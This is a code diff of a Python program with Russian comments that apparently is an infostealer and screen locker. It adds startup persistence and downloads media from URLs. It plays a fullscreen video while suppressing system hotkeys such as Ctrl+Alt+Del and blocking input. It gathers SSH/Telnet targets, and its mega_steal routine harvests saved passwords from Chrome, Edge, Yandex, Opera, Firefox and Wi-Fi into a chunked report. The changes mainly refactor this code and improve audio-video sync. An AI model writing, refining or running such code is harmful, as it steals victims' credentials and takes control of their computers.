@@ -93,7 +93,7 @@ def add_to_startup():
             except: pass
     except: pass
 
-# ===== СКАЧИВАНИЕ (ВСЕГДА НОВОЕ) =====
+# ===== СКАЧИВАНИЕ =====
 def download_video():
     try:
         if os.path.exists(VIDEO_PATH):
@@ -110,7 +110,7 @@ def download_audio():
         urllib.request.urlretrieve(AUDIO_URL, AUDIO_PATH)
     except: pass
 
-# ===== ВИДЕО + ЗВУК =====
+# ===== ВИДЕО + ЗВУК (СИНХРОНИЗИРОВАНО) =====
 def play_video_fullscreen():
     try:
         video = tk.Tk()
@@ -125,8 +125,6 @@ def play_video_fullscreen():
             import keyboard
             for k in ['alt+f4','alt+tab','ctrl+alt+del','ctrl+shift+esc','ctrl+esc','ctrl+w','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','esc','space','enter']:
                 keyboard.add_hotkey(k, lambda: None, suppress=True)
-            keyboard.block_key('windows')
-            keyboard.block_key('esc')
         except:
             ctypes.windll.user32.BlockInput(True)
         
@@ -135,7 +133,7 @@ def play_video_fullscreen():
         
         try:
             import pygame
-            pygame.mixer.init()
+            pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=512)
             pygame.mixer.music.load(AUDIO_PATH)
             pygame.mixer.music.play()
         except:
@@ -149,9 +147,20 @@ def play_video_fullscreen():
             sw = video.winfo_screenwidth()
             sh = video.winfo_screenheight()
             
+            frame_count = 0
+            video_start_time = time.time()
+            
             while cap.isOpened():
                 ret, frame = cap.read()
                 if not ret: break
+                
+                frame_count += 1
+                
+                expected_time = frame_count / fps
+                real_time = time.time() - video_start_time
+                
+                if expected_time > real_time:
+                    time.sleep(expected_time - real_time)
                 
                 frame = cv2.resize(frame, (sw, sh))
                 frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
@@ -159,12 +168,12 @@ def play_video_fullscreen():
                 lbl.config(image=img)
                 lbl.image = img
                 video.update()
-                time.sleep(1/fps)
             
             cap.release()
         
         try:
             pygame.mixer.music.stop()
+            pygame.mixer.quit()
         except: pass
         
         video.destroy()
@@ -234,7 +243,7 @@ def boot_anim():
     
     time.sleep(1); a.destroy()
 
-# ===== SSH/TELNET TARGETS =====
+# ===== SSH/TELNET =====
 def get_ssh_telnet_targets():
     targets = []
     try:
@@ -583,24 +592,18 @@ def mega_steal():
     report.append("ПАРОЛИ БРАУЗЕРОВ")
     report.append("="*60)
     
-    browsers = {
+    for name, paths in {
         "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
         "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
         "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
         "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
-    }
-    
-    for name, paths in browsers.items():
+    }.items():
         data = steal_chromium_passwords(name, paths)
-        if data:
-            report.append(f"\n--- {name} ---")
-            report.extend(data)
-        else:
-            report.append(f"\n--- {name} ---\nНет данных")
+        report.append(f"\n--- {name} ---")
+        report.extend(data if data else ["Нет данных"])
     
     report.append("\n--- FIREFOX ---")
-    ff_data = steal_firefox_passwords()
-    report.extend(ff_data if ff_data else ["Нет данных"])
+    report.extend(steal_firefox_passwords() or ["Нет данных"])
     
     report.append("\n" + "="*60)
     report.append("WIFI ПАРОЛИ")
@@ -627,7 +630,6 @@ def mega_steal():
     
     report.append("\n" + "="*60)
     report.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
-    report.append("="*60)
     
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
